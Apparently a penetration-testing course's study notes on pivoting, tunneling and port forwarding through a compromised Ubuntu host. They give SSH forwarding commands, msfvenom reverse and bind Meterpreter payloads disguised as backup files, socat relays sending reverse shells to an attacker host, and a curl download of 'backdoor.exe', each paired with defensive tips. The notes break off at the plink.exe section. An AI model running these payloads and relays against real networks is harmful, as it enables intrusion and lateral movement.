---
title: "Pivoting, Tunneling, and Port Forwarding"
description: "Used in post-exploitation, pivoting, tunneling, and port forwarding help attackers move laterally, hide traffic, and access internal systems that are otherwise unreachable"
pubDate: "May 19 2025"
heroImage: "/pt2.png"
---

### Notes on Pivoting, Tunneling, and Port Forwarding

**Network Setup**:
- **Pivot Host**: Ubuntu Server with dual interfaces:
  - 10.129.x.x (external-facing).
  - 172.16.5.0/23 (internal, 512 addresses: 172.16.4.0–172.16.5.255).
- **Attack Host**: Multiple interfaces in 10.10.14.x range, used by attacker to connect to pivot host.
- **Role**: Pivot host bridges external (10.129.x.x) and internal (172.16.5.0/23) networks, enabling access to isolated systems.

**Pivoting**:
- **Definition**: Using a compromised pivot host to access systems/networks not directly reachable from the attacker’s machine.
- **Purpose**: Facilitates lateral movement to internal systems (e.g., in 172.16.5.0/23) via the pivot host.
- **Process**: Route traffic through pivot host to target internal systems, leveraging its network connectivity.
- **Tools**: Metasploit (e.g., `route`), Proxychains, or iptables.
- **Example**: Attacker uses pivot host to reach a server at 172.16.5.10 from 10.10.14.x.

**Lateral Movement**:
- **Definition**: Moving between systems within a network to expand access after initial compromise.
- **Role**: Enabled by pivoting, targets internal systems using exploits, stolen credentials, or service attacks (e.g., SMB, RDP).
- **Tools**: Metasploit, CrackMapExec, BloodHound for enumeration and attacks.

**Tunneling**:
- **Definition**: Creating a secure channel to route traffic through a network, bypassing restrictions.
- **Purpose**: Connects attacker to internal systems via pivot host, often covertly.
- **Example**: SSH tunnel (`ssh -L 1234:172.16.5.10:80 user@10.129.x.x`) forwards traffic to a target’s web server.
- **Tools**: SSH, Proxychains, Chisel, SOCKS proxies.

**Port Forwarding**:
- **Definition**: Redirecting traffic from one port to another to access remote services.
- **Types**:
  - **Local**: Maps local port to remote service (e.g., `ssh -L 3389:172.16.5.10:3389` for RDP).
  - **Dynamic**: Uses SOCKS proxy for flexible routing (e.g., `ssh -D 9050`).
- **Tools**: SSH, Netcat, Metasploit’s portfwd.
- **Example**: Access internal HTTP server via pivot host using local port forwarding.

**Key Takeaways**:
- Pivot host’s dual-network access is critical for reaching internal systems.
- Pivoting enables lateral movement, targeting internal assets.
- Tunneling and port forwarding facilitate traffic routing to specific services.
- Common in penetration testing to test network defenses.

**Security Tips**:
- Segment networks to isolate internal systems.
- Restrict pivot host’s outbound traffic and permissions.
- Monitor for unusual traffic or tunnels (e.g., SSH to internal IPs).
- Harden pivot host by disabling unnecessary services and using MFA.

### Notes on Networking Concepts for Pivoting, Tunneling, and Port Forwarding

**Overview**:
- Focuses on essential networking concepts (IP addressing, NICs, routing, protocols/ports) required to understand and execute pivoting effectively in penetration testing.

**1. IP Addressing & Network Interface Controllers (NICs)**:
- **IP Addressing**:
  - Every networked device requires an IP address to communicate.
  - Assigned dynamically (via DHCP) or statically (common for servers, routers, printers, critical devices).
- **Network Interface Controllers (NICs)**:
  - NICs (physical or virtual) are assigned IP addresses, enabling multi-network communication.
  - A system with multiple NICs can have multiple IPs, connecting to different networks.
- **Relevance to Pivoting**:
  - Compromised hosts’ IP assignments reveal reachable networks, critical for identifying pivoting opportunities.
  - Example: A host with IPs in external (e.g., 134.122.100.200) and internal (e.g., 10.106.0.172) networks can bridge them.
- **Commands**:
  - Linux/macOS: `ifconfig` (shows NICs, IPs, netmasks, etc.).
  - Windows: `ipconfig`.
- **Example `ifconfig` Output**:
  - **eth0**: IP 134.122.100.200, netmask 255.255.240.0 (external network).
  - **eth1**: IP 10.106.0.172, netmask 255.255.240.0 (internal network).
  - **tun0**: IP 10.10.15.54, netmask 255.255.254.0 (VPN/tunnel interface).
  - **lo**: Loopback (127.0.0.1).
- **Key Insight**: Check all NICs on a compromised host to map accessible networks.

**2. Routing**:
- **Definition**: Process of forwarding network traffic based on destination IP addresses using a routing table.
- **Routing Table**:
  - Defines where packets are sent based on destination networks.
  - Includes directly connected networks, static routes, or dynamically learned routes (not used in Pwnbox example).
- **Pwnbox Routing Table Example**:
  - Default gateway: 178.62.64.1 (for unknown destinations).
  - Routes:
    - 10.10.10.0/23 → Gateway 10.10.14.1.
    - 10.10.14.0/23 → Directly connected.
    - 10.129.0.0/16 → Gateway 10.10.14.1.
    - 178.62.64.0/18 → Directly connected.
  - Traffic to 10.129.10.25 uses gateway 10.10.14.1 via corresponding NIC.
- **Relevance to Pivoting**:
  - Routing tables on pivot hosts indicate reachable networks.
  - Tools like `AutoRoute` (e.g., in Metasploit) configure pivot hosts to route traffic to target networks.
- **Commands**:
  - Linux: `netstat -r` or `ip route`.
- **Key Insight**: Add routes or use tools to enable traffic forwarding to internal networks via pivot hosts.

**3. Protocols, Services, & Ports**:
- **Protocols**: Rules governing network communication (e.g., HTTP, SSH).
- **Ports**:
  - Logical identifiers for applications/services (e.g., HTTP on port 80).
  - Open ports indicate exploitable services if not blocked by firewalls.
- **Relevance to Pivoting**:
  - Open ports (e.g., HTTP on 80) are entry points for initial access or pivoting.
  - Example: A web server on port 80 is typically unblocked, allowing attacker access.
- **Source Ports**:
  - Generated client-side to track connections.
  - Must align with payloads/listeners to ensure successful communication (e.g., reverse shells).
- **Key Insight**: Identify open ports on pivot hosts or targets for exploitation; ensure proper port configuration for payloads.

**Key Takeaways**:
- **IP Addressing/NICs**: Multiple NICs on a pivot host reveal accessible networks (e.g., external vs. internal).
- **Routing**: Routing tables guide traffic forwarding; tools like `AutoRoute` enable pivoting to new networks.
- **Ports/Protocols**: Open ports (e.g., 80, 22) are pivoting entry points; source ports ensure payload connectivity.
- **Practical Application**:
  - Use `ifconfig`/`ipconfig` to map NICs/IPs.
  - Check routing tables (`ip route`) to identify pivot opportunities.
  - Scan for open ports (e.g., with `nmap`) to target services.

**Security Tips**:
- Restrict unnecessary NICs/IP assignments on critical systems.
- Monitor routing changes to detect unauthorized traffic forwarding.
- Block non-essential ports; enforce firewall rules to limit service exposure.

### Notes on Dynamic Port Forwarding with SSH and SOCKS Tunneling

**Overview**:
- Focuses on SSH-based port forwarding (local and dynamic) and SOCKS tunneling to pivot through a compromised host to access internal network services.

**1. SSH Local Port Forwarding**:
- **Definition**: Maps a local port on the attacker's machine to a service on a remote host via a pivot host.
- **Example Scenario**:
  - **Attack Host**: 10.10.15.5.
  - **Pivot Host (Victim)**: 10.129.282.64 (running SSH on port 22).
  - **Target Service**: MySQL (port 3306) on pivot host (localhost:3306 from pivot’s perspective).
- **Command**:
  - `ssh -L 1234:localhost:3306 ubuntu@10.129.282.64`
  - Forwards local port 1234 (attack host) to MySQL (port 3306) on pivot host.
- **Usage**:
  - Access MySQL locally on attack host via `localhost:1234`.
  - Enables running exploits or tools (e.g., MySQL client) against the service.
- **Key Insight**: Local forwarding is ideal for targeting a specific service on the pivot host or another reachable host.

**2. Scanning the Pivot Target**:
- **Purpose**: Identify open ports/services on the pivot host to determine pivoting opportunities.
- **Example Command**:
  - `nmap -sT -p22,3306 10.129.282.64`
  - Result: Port 22 (SSH) open, port 3306 (MySQL) closed externally.
- **Post-Forwarding Scan**:
  - After setting up forwarding (`-L 1234:localhost:3306`):
  - `nmap localhost -p1234`
  - Result: Port 1234 open, identified as MySQL (version: 8.0.28).
- **Key Insight**: Forwarded ports allow local access to services that are otherwise inaccessible externally.

**3. Forwarding Multiple Ports**:
- **Purpose**: Access multiple services on the pivot host or other internal hosts.
- **Command**:
  - `ssh -L 1234:localhost:3306 -L 6050:localhost:80 ubuntu@10.129.282.64`
  - Forwards:
    - Local port 1234 → MySQL (3306).
    - Local port 6050 → Web server (80).
- **Key Insight**: Multiple `-L` flags enable simultaneous access to different services, enhancing pivoting flexibility.

**4. Dynamic Port Forwarding with SOCKS**:
- **Definition**: Creates a SOCKS proxy on the attack host to dynamically route traffic to multiple internal hosts/services via the pivot host.
- **Command**:
  - `ssh -D 9050 ubuntu@10.129.282.64`
  - Sets up a SOCKS proxy on `localhost:9050`.
- **Usage with Proxychains**:
  - Configure `/etc/proxychains.conf` to use SOCKS proxy (e.g., `socks4 127.0.0.1 9050`).
  - Run tools through proxy: `proxychains nmap 172.16.5.2` or `proxychains msfconsole`.
- **Example Scans**:
  - **Web Server**: `proxychains nmap -sT -p80 172.16.5.2`
    - Routes traffic through SOCKS proxy (127.0.0.1:9050) to internal host (172.16.5.2:80).
  - **Windows Host**: `proxychains nmap -sT -p445 172.16.5.10`
    - Targets SMB on internal Windows host.
  - **RDP**: `proxychains xfreerdp /u:username /p:password /v:172.16.5.19:3389`
    - Connects to RDP on internal host.
- **Challenges**:
  - Windows Defender may block ICMP (ping), requiring `-Pn` (no ping) in `nmap` scans.
- **Key Insight**: Dynamic forwarding is versatile, allowing access to any internal host/port without predefined mappings.

**5. Setting Up to Pivot**:
- **Steps**:
  - Verify SSH access to pivot host (10.129.282.64:22).
  - Check pivot host’s network interfaces (`ifconfig`) for internal network access (e.g., 172.16.5.0/23).
  - Set up local (`-L`) or dynamic (`-D`) forwarding based on target services.
- **Key Insight**: Pivot host’s network connectivity (e.g., to 172.16.5.0/23) determines reachable internal targets.

**Key Takeaways**:
- **Local Port Forwarding**: Targets specific services (e.g., MySQL on 3306) using `-L`.
- **Dynamic Port Forwarding**: Uses SOCKS proxy (`-D`) for flexible access to multiple internal hosts/services.
- **Proxychains**: Routes tools (nmap, msfconsole, xfreerdp) through SOCKS proxy to internal networks.
- **Practical Application**:
  - Scan pivot host for open ports (`nmap`).
  - Use local forwarding for single-service access.
  - Use dynamic forwarding with Proxychains for broad internal network exploration.
- **Limitations**:
  - External port access may be restricted (e.g., MySQL closed on 10.129.282.64).
  - Windows hosts may block ICMP, requiring adjusted scan techniques.

**Security Tips**:
- Restrict SSH access on pivot hosts (e.g., limit to specific IPs, use key-based auth).
- Monitor for unusual SSH connections or SOCKS proxy traffic.
- Block unnecessary internal network access from pivot hosts.
- Enforce strong firewall rules to limit service exposure (e.g., MySQL, HTTP).

### Notes on Remote/Reverse Port Forwarding with SSH

**Overview**:
- Focuses on SSH remote/reverse port forwarding, enabling a local service on the attacker's machine to be accessed from a remote pivot host or its network, useful for scenarios where direct access to the attacker's machine is restricted.

**1. Remote/Reverse Port Forwarding**:
- **Definition**: Forwards a port on the pivot host (or a host in its network) to a service running on the attacker's local machine.
- **Use Case**: Allows a target (e.g., Windows host in the pivot host’s network) to access a service (e.g., a malicious payload) hosted on the attacker's machine via the pivot host.
- **Command**:
  - `ssh -R <remote_port>:localhost:<local_port> user@<pivot_host>`
  - Example: `ssh -R 8123:localhost:8123 ubuntu@<pivot_ip>`
    - Maps port 8123 on the pivot host to port 8123 on the attacker's machine.
- **Key Insight**: Reverse forwarding exposes a local service (e.g., a web server hosting a payload) to the pivot host or its network, facilitating attacks like payload delivery.

**2. Scenario Example**:
- **Attack Host**: Running a local service (e.g., Python web server on port 8123 hosting a payload).
- **Pivot Host**: Ubuntu server (e.g., 10.129.282.64) with SSH access.
- **Target**: Windows host in the pivot’s internal network (e.g., 172.16.5.10).
- **Goal**: Deliver a payload (e.g., `backdoor.exe`) from the attacker's machine to the Windows target via the pivot host.

**3. Steps to Execute Reverse Port Forwarding**:
- **Step 1: Start a Web Server on Attack Host**:
  - Command: `python3 -m http.server 8123`
  - Hosts payload (e.g., `backdoor.exe`) on `localhost:8123`.
- **Step 2: Set Up Reverse Port Forwarding**:
  - Command: `ssh -R 8123:localhost:8123 ubuntu@<pivot_ip>`
  - Exposes attacker’s web server (port 8123) on pivot host’s port 8123.
- **Step 3: Download Payload on Windows Target**:
  - On Windows target (e.g., 172.16.5.10):
    - Use a browser or command (e.g., `curl http://<pivot_ip>:8123/backdoor.exe -o backdoor.exe`) to download the payload from the pivot host’s port 8123.
- **Step 4: Verify Connection**:
  - On the Windows target, use `netstat` to confirm the connection to the pivot host’s port 8123 (indicating SSH service involvement).
- **Key Insight**: The pivot host acts as a relay, making the attacker’s local service accessible to internal network hosts.

**4. Practical Application**:
- **Payload Delivery**: Host a malicious executable or script on the attacker's machine and use reverse forwarding to make it downloadable from the pivot host.
- **Network Restrictions**: Useful when the target cannot directly reach the attacker's machine (e.g., due to NAT or firewall rules).
- **Example Workflow**:
  - Compromise Ubuntu pivot host via SSH.
  - Identify internal network (e.g., 172.16.5.0/23) using `ifconfig` on pivot host.
  - Set up reverse forwarding to expose a web server.
  - Instruct the Windows target to download and execute the payload.

**Key Takeaways**:
- **Reverse Port Forwarding**: Uses `-R` to map a pivot host’s port to a local service on the attacker’s machine.
- **Use Case**: Enables internal hosts to access attacker-hosted services (e.g., payloads) via the pivot host.
- **Practical Steps**:
  - Host a service (e.g., Python web server) on the attacker's machine.
  - Use `ssh -R` to forward the service to the pivot host.
  - Access the service from the target via the pivot host’s IP and port.
- **Verification**: Use `netstat` on the target to confirm connections to the pivot host’s SSH service.

**Security Tips**:
- Restrict SSH access on pivot hosts (e.g., key-based authentication, IP whitelisting).
- Monitor pivot host for unusual port bindings or incoming connections.
- Block unnecessary outbound traffic from internal hosts to pivot host ports.
- Audit pivot host’s network interfaces to limit exposure to internal networks.

**Limitations**:
- Requires SSH access to the pivot host.
- Pivot host must allow port binding for reverse forwarding.
- Target must be able to reach the pivot host’s forwarded port.

### Notes on Meterpreter Tunneling & Port Forwarding

**Overview**:
- Focuses on using Meterpreter (Metasploit’s post-exploitation tool) for tunneling and port forwarding through a compromised Ubuntu pivot host to access internal network services, without relying on SSH.

**1. Establishing a Meterpreter Session**:
- **Objective**: Gain a Meterpreter shell on the pivot host (Ubuntu server, e.g., 10.129.202.64) to enable pivoting.
- **Steps**:
  - **Generate Payload**:
    - Command: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf > backupjob`
    - Creates a reverse TCP payload (`backupjob`) for Linux x64, connecting back to the attack host (10.10.14.18:8080).
    - Payload size: 130 bytes, ELF file: 250 bytes.
  - **Set Up Multi/Handler**:
    - Commands:
      ```
      msf6 > use exploit/multi/handler
      msf6 exploit(multi/handler) > set lhost 0.0.0.0
      msf6 exploit(multi/handler) > set lport 8080
      msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
      msf6 exploit(multi/handler) > run
      ```
    - Starts a reverse TCP handler on 0.0.0.0:8080 to catch the Meterpreter session.
  - **Transfer and Execute Payload**:
    - Copy `backupjob` to the Ubuntu pivot host via SSH.
    - Execute: `ubuntu@WebServer:~/backupjob`
    - Result: Meterpreter session established (e.g., 10.10.14.18:8080 → 10.129.202.64:39826).
- **Key Insight**: The Meterpreter session provides a robust platform for post-exploitation tasks, including pivoting and tunneling.

**2. Network Enumeration via Pivot**:
- **Objective**: Scan the internal network (e.g., 172.16.5.0/23) through the pivot host.
- **Ping Sweep**:
  - Command: `run autoroute -s 172.16.5.0/23` (from Meterpreter session).
  - Performs a ping sweep to identify live hosts.
  - Note: Initial sweeps may fail due to ARP cache delays; repeat scans or use `-Pn` (no ping) for Nmap if ICMP is blocked.
- **Key Insight**: Meterpreter’s routing capabilities allow enumeration of internal networks unreachable from the attack host.

**3. Configuring SOCKS Proxy for Dynamic Tunneling**:
- **Objective**: Route traffic through the Meterpreter session to access internal hosts dynamically.
- **Steps**:
  - **Set Up SOCKS Proxy**:
    - Commands:
      ```
      msf6 > use auxiliary/server/socks_proxy
      msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
      msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
      msf6 auxiliary(server/socks_proxy) > set version 4a
      msf6 auxiliary(server/socks_proxy) > run
      ```
    - Starts a SOCKS4a proxy on 0.0.0.0:9050, routing traffic via the Meterpreter session.
  - **Verify Proxy**:
    - Command: `jobs` (confirms the SOCKS proxy is running as a background job).
  - **Route Internal Network**:
    - Command: `run post/multi/manage/autoroute SUBNET=172.16.5.0/23`
    - Adds a route to 172.16.5.0/255.255.254.0 via the pivot host.
    - Verify: `run autoroute -p` (lists active routes, e.g., 172.16.5.0/23 via Session 1).
  - **Test with Proxychains**:
    - Configure `/etc/proxychains.conf` with `socks4 127.0.0.1 9050`.
    - Command: `proxychains nmap -sT -p3389 172.16.5.19 -Pn`
    - Result: Discovers open port 3389 (RDP) on 172.16.5.19, confirming proxy functionality.
- **Key Insight**: The SOCKS proxy enables dynamic access to multiple internal hosts/services, similar to SSH dynamic forwarding but integrated with Metasploit.

**4. Local Port Forwarding with Meterpreter**:
- **Objective**: Forward a specific internal service (e.g., RDP on 172.16.5.19:3389) to the attack host.
- **Command**:
  - `meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19`
  - Creates a local TCP relay: `localhost:3300` → `172.16.5.19:3389` via the Meterpreter session.
- **Usage**:
  - Command: `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
  - Establishes an RDP session to 172.16.5.19:3389 through the pivot host.
  - Verify: `netstat -antp` (shows an established connection on 127.0.0.1:3300).
- **Key Insight**: Meterpreter’s `portfwd` module mimics SSH local port forwarding, allowing direct access to specific internal services.

**5. Reverse Port Forwarding with Meterpreter**:
- **Objective**: Forward connections from a port on the pivot host to a service on the attack host, enabling a Windows target to connect back to the attacker.
- **Steps**:
  - **Set Up Reverse Port Forwarding**:
    - Command: `portfwd add -R -l 8081 -p 1234 -L 0.0.0.0`
    - Forwards connections from pivot host’s port 1234 to attack host’s port 8081.
  - **Configure Multi/Handler for Windows Payload**:
    - Commands:
      ```
      msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
      msf6 exploit(multi/handler) > set LPORT 8081
      msf6 exploit(multi/handler) > set LHOST 0.0.0.0
      msf6 exploit(multi/handler) > run
      ```
    - Starts a handler on 0.0.0.0:8081 for a Windows Meterpreter session.
  - **Generate Windows Payload**:
    - Command: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe > backupscript.exe`
    - Creates a reverse TCP payload (`backupscript.exe`) targeting the pivot host (172.16.5.129:1234).
    - Payload size: 510 bytes, EXE file: 7168 bytes.
  - **Execute Payload on Windows Target**:
    - Transfer `backupscript.exe` to the Windows host (172.16.5.129) and execute.
    - Result: Meterpreter session established (e.g., 10.10.14.18:8081 → 10.10.14.18:40173).
    - Access Windows shell: `meterpreter > shell` (e.g., Windows 10.0.17763.1637).
- **Key Insight**: Reverse port forwarding allows the pivot host to relay connections from internal targets to the attacker, similar to SSH reverse forwarding.

**Key Takeaways**:
- **Meterpreter Session**: Established via a reverse TCP payload (`msfvenom`) and multi/handler, providing a powerful pivoting platform.
- **SOCKS Proxy**: Uses `auxiliary/server/socks_proxy` for dynamic tunneling, routing traffic through the Meterpreter session (e.g., Nmap scans via Proxychains).
- **Local Port Forwarding**: Uses `portfwd add` to map internal services (e.g., RDP) to the attack host, akin to SSH `-L`.
- **Reverse Port Forwarding**: Uses `portfwd add -R` to relay connections from the pivot host to the attack host, enabling payloads to connect back.
- **Autoroute**: Adds routes to internal networks (e.g., 172.16.5.0/23) for seamless traffic routing.
- **Practical Workflow**:
  - Compromise the Ubuntu pivot host with a Meterpreter payload.
  - Add routes to the internal network (`autoroute`).
  - Set up SOCKS proxy or port forwarding for enumeration or exploitation.
  - Deliver a Windows payload via reverse port forwarding for further compromise.

**Security Tips**:
- Monitor for unauthorized Meterpreter payloads or unusual network connections on pivot hosts.
- Restrict execution of unknown binaries (e.g., `backupjob`, `backupscript.exe`).
- Block outbound connections to suspicious IPs/ports (e.g., 10.10.14.18:8080).
- Use firewalls to limit internal network access from pivot hosts.
- Audit routing tables and proxy configurations for anomalies.

**Limitations**:
- Requires initial compromise of the pivot host to deploy the Meterpreter payload.
- ICMP blocks may necessitate TCP-based scans (`-Pn`).
- Relies on Metasploit’s infrastructure, which may be detected by advanced defenses.

### Notes on Socat Redirection with a Reverse Shell

**Overview**:
- Focuses on using `socat`, a bidirectional relay tool, to redirect network traffic through a compromised Ubuntu pivot host (e.g., 10.129.202.64) to establish a reverse shell from a Windows target (e.g., 172.16.5.129) to the attack host (e.g., 10.10.14.18), without relying on SSH tunneling.

**1. Socat Redirection**:
- **Definition**: `socat` creates a pipe between two network channels, acting as a redirector to forward traffic from one host/port to another.
- **Use Case**: Redirects a reverse shell connection from a Windows target through the pivot host to the attack host’s listener.
- **Command**:
  - On the Ubuntu pivot host:
    - `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`
    - Listens on `localhost:8080` (pivot host) and forwards all traffic to the attack host (10.10.14.18:80).
- **Key Insight**: `socat` provides a lightweight alternative to SSH or Meterpreter for traffic redirection, requiring minimal configuration.

**2. Scenario Setup**:
- **Attack Host**: 10.10.14.18, running a Metasploit listener on port 80.
- **Pivot Host**: Ubuntu server (10.129.202.64), running `socat` to redirect traffic.
- **Target**: Windows host (172.16.5.129) in the pivot’s internal network.
- **Goal**: Execute a payload on the Windows host to connect back to the pivot host’s `socat` listener, which redirects the connection to the attack host, establishing a Meterpreter session.

**3. Steps to Execute Socat Redirection**:
- **Step 1: Start Socat on Pivot Host**:
  - Command: `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`
  - Configures the pivot host to listen on port 8080 and forward traffic to 10.10.14.18:80.
  - The `fork` option allows handling multiple connections.
- **Step 2: Generate Windows Payload**:
  - Command:
    - `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe > backupscript.exe`
    - Creates a reverse HTTPS Meterpreter payload (`backupscript.exe`) targeting the pivot host (172.16.5.129:8080).
    - Payload size: 743 bytes, EXE file: 7168 bytes.
- **Step 3: Configure Metasploit Multi/Handler**:
  - Commands:
    ```
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    msf6 exploit(multi/handler) > set lport 80
    msf6 exploit(multi/handler) > run
    ```
    - Starts an HTTPS reverse handler on 0.0.0.0:80 to catch the Meterpreter session.
- **Step 4: Transfer and Execute Payload**:
  - Transfer `backupscript.exe` to the Windows host (e.g., via SMB, HTTP, or previous pivot techniques).
  - Execute the payload on the Windows host.
- **Step 5: Establish Meterpreter Session**:
  - The Windows payload connects to 172.16.5.129:8080 (pivot host’s `socat` listener).
  - `socat` redirects the connection to 10.10.14.18:80 (attack host’s listener).
  - Result: Meterpreter session established, with traffic originating from the pivot host (10.129.202.64).
- **Key Insight**: `socat` acts as a relay, making the attack host’s listener accessible to the Windows target via the pivot host.

**4. Practical Application**:
- **Payload Delivery**: Use `socat` to redirect reverse shell connections when SSH or Meterpreter tunneling is unavailable or undesirable.
- **Network Restrictions**: Effective in scenarios where the Windows target can only reach the pivot host (e.g., due to NAT or firewall rules).
- **Example Workflow**:
  - Compromise the Ubuntu pivot host and install `socat`.
  - Start `socat` to redirect traffic from a pivot host port (8080) to the attack host’s listener (80).
  - Deploy and execute a reverse shell payload on the Windows target, targeting the pivot host’s `socat` port.
  - Receive the Meterpreter session on the attack host via the redirected connection.

**Key Takeaways**:
- **Socat Redirection**: Uses `socat TCP4-LISTEN:<port>,fork TCP4:<attack_host>:<port>` to relay traffic from the pivot host to the attack host.
- **Reverse Shell**: A Windows Meterpreter payload (`reverse_https`) connects to the pivot host’s `socat` listener, which forwards the connection to the attack host.
- **Metasploit Handler**: Configures a `multi/handler` with `reverse_https` to catch the redirected session.
- **Advantages**:
  - Lightweight and independent of SSH or Meterpreter.
  - Simple setup for redirecting specific ports.
- **Workflow**:
  - Set up `socat` on the pivot host.
  - Generate and deploy a payload targeting the pivot host’s `socat` port.
  - Start a Metasploit listener to receive the redirected shell.

**Security Tips**:
- Monitor pivot hosts for `socat` processes or unusual port listeners (e.g., 8080).
- Restrict execution of unauthorized binaries (e.g., `backupscript.exe`) on Windows hosts.
- Block outbound connections from pivot hosts to external IPs (e.g., 10.10.14.18:80).
- Use network segmentation to limit pivot host access to internal networks.
- Audit network traffic for unexpected HTTPS connections from pivot hosts.

**Limitations**:
- Requires `socat` to be installed on the pivot host (may need manual installation).
- Pivot host must allow binding to the specified port (e.g., 8080).
- Relies on the Windows target reaching the pivot host’s `socat` listener.
- HTTPS payloads may be detected by advanced network monitoring.

### Notes on Socat Redirection with a Bind Shell

**Overview**:
- Focuses on using `socat` to redirect traffic to a bind shell on a Windows target (e.g., 172.16.5.19) through a compromised Ubuntu pivot host (e.g., 10.129.282.64), allowing the attack host (e.g., 10.10.14.18) to connect to the target’s shell without direct network access.

**1. Bind Shell with Socat Redirection**:
- **Definition**: A bind shell listens on a specific port on the target host, and `socat` redirects connections from the pivot host to this port, enabling the attack host to access the shell.
- **Use Case**: Useful when the Windows target can only be reached via the pivot host due to network restrictions (e.g., NAT or firewalls).
- **Key Insight**: `socat` acts as a relay, forwarding connections from the pivot host to the bind shell on the Windows target, bypassing direct connectivity requirements.

**2. Scenario Setup**:
- **Attack Host**: 10.10.14.18, running a Metasploit multi/handler to connect to the bind shell.
- **Pivot Host**: Ubuntu server (10.129.282.64), running `socat` to redirect traffic.
- **Target**: Windows host (172.16.5.19) in the pivot’s internal network, running a bind shell payload.
- **Goal**: Execute a bind shell payload on the Windows target, use `socat` on the pivot host to redirect connections, and establish a Meterpreter session from the attack host.

**3. Steps to Execute Socat Redirection with Bind Shell**:
- **Step 1: Generate Windows Bind Shell Payload**:
  - Command:
    - `msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe > backupscript.exe`
    - Creates a bind TCP Meterpreter payload (`backupscript.exe`) that listens on port 8443 on the Windows target.
    - Payload size: 499 bytes, EXE file: 7168 bytes.
- **Step 2: Transfer Payload to Windows Target**:
  - Transfer `backupscript.exe` to the Windows host (172.16.5.19) using previous techniques (e.g., SMB, HTTP, or pivot host relay).
  - Execute the payload to start the bind shell listener on 172.16.5.19:8443.
- **Step 3: Start Socat on Pivot Host**:
  - Command:
    - `socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`
    - Listens on the pivot host (10.129.282.64:8080) and forwards all traffic to the Windows target (172.16.5.19:8443).
    - The `fork` option allows handling multiple connections.
- **Step 4: Configure Metasploit Multi/Handler**:
  - Commands:
    ```
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
    msf6 exploit(multi/handler) > set RHOST 10.129.282.64
    msf6 exploit(multi/handler) > set LPORT 8080
    msf6 exploit(multi/handler) > run
    ```
    - Starts a bind TCP handler targeting the pivot host (10.129.282.64:8080), where `socat` redirects to the Windows target’s bind shell.
- **Step 5: Establish Meterpreter Session**:
  - The multi/handler connects to 10.129.282.64:8080 (pivot host’s `socat` listener).
  - `socat` redirects the connection to 172.16.5.19:8443 (Windows target’s bind shell).
  - Result: Meterpreter session established (e.g., 10.10.14.18:46259 → 10.129.282.64:8080 → 172.16.5.19:8443).
  - Verification: `meterpreter > getuid` (returns `NT AUTHORITY\victor` on the Windows target).
- **Key Insight**: `socat` enables the attack host to reach the Windows target’s bind shell by relaying traffic through the pivot host, mimicking a direct connection.

**4. Practical Application**:
- **Bind Shell Access**: Use `socat` to connect to a bind shell when the target is only accessible via the pivot host.
- **Network Restrictions**: Effective for internal network targets behind firewalls or NAT, where direct connections to the target are blocked.
- **Example Workflow**:
  - Compromise the Ubuntu pivot host and ensure `socat` is installed.
  - Deploy a bind shell payload on the Windows target, listening on a specific port (e.g., 8443).
  - Configure `socat` on the pivot host to redirect connections from a pivot port (8080) to the target’s bind shell port (8443).
  - Use Metasploit to connect to the pivot host’s `socat` port and establish a Meterpreter session.

**Key Takeaways**:
- **Socat Redirection**: Uses `socat TCP4-LISTEN:<port>,fork TCP4:<target_ip>:<target_port>` to relay traffic from the pivot host to the Windows target’s bind shell.
- **Bind Shell**: A Meterpreter `bind_tcp` payload listens on the target (e.g., 172.16.5.19:8443) for incoming connections.
- **Metasploit Handler**: Configures a `multi/handler` with `bind_tcp` to connect to the pivot host’s `socat` port, reaching the target’s bind shell.
- **Advantages**:
  - Lightweight redirection without SSH or Meterpreter dependencies.
  - Simple setup for accessing bind shells on internal hosts.
- **Workflow**:
  - Generate and execute a bind shell payload on the Windows target.
  - Set up `socat` on the pivot host to redirect to the target’s bind shell port.
  - Connect to the pivot host’s `socat` port with Metasploit to establish a session.

**Security Tips**:
- Monitor pivot hosts for `socat` processes or unexpected listeners (e.g., port 8080).
- Prevent execution of unauthorized binaries (e.g., `backupscript.exe`) on Windows hosts.
- Block inbound connections to non-standard ports (e.g., 8443) on internal hosts.
- Use network segmentation to restrict pivot host access to internal networks.
- Audit traffic for unusual connections from pivot hosts to internal targets.

**Limitations**:
- Requires `socat` installation on the pivot host.
- Pivot host must allow binding to the specified port (e.g., 8080).
- Bind shells are less stealthy than reverse shells, as they require an open port on the target.
- Relies on the attack host reaching the pivot host’s `socat` listener.

### Notes on SSH for Windows: plink.exe

**Overview**:
- Focuses on using `plink.exe`, a command-line SSH client from PuTTY, to perform SSH port forwarding on a Windows pivot host (e.g., 172.16.5.19) to access services or deliver payloads through an Ubuntu SSH server (e.g., 10.129.202.64), with Proxifier for dynamic traffic routing.

**1. Plink.exe for SSH Port Forwarding**:
- **Definition**: `plink.exe` is a lightweight SSH client for Windows, supporting local, remote, and dynamic port forwarding, similar to OpenSSH.
- **Use Case**: Enables a Windows pivot host to forward traffic to internal network services or expose attacker services to internal targets via an SSH server.
- **Key Insight**: `plink.exe` provides SSH tunneling capabilities on Windows without requiring a full PuTTY installation, ideal for post-exploitation scenarios.

**2. Scenario Setup**:
- **Attack Host**: 10.10.14.18, hosting services or listeners (e.g., web server or Metasploit handler).
- **Pivot Host**: Windows host (172.16.5.19), running `plink.exe` to establish SSH tunnels.
- **SSH Server**: Ubuntu server (10.129.202.64), acting as the SSH relay.
- **Target**: Internal network services (e.g., 172.16.5.20:445) or hosts accessible via the pivot.
